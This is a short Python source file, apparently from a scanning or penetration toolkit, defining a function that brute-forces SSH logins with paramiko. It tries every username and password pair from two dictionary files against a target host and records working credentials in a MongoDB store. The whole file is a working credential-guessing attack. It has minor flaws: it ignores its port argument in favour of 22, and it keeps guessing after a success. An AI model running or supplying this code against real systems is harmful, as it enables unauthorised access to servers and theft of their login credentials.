# coding:utf-8

import paramiko


def ssh_attack(host, port, mongo):
    _info = dict(
        name="ssh",
        ip=host,
        port=port,
        username="",
        password=""
    )

    # 字典爆破测试
    for username in open("dict/ssh_user.dic", "r"):
        for password in open("dict/ssh_pass.dic", "r"):
            _username = username.strip()
            _password = password.strip()
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, 22, _username, _password, timeout=5)
                _info["username"] = _username
                _info["password"] = _password
                mongo.insert(_info)
                break
            except:
                pass
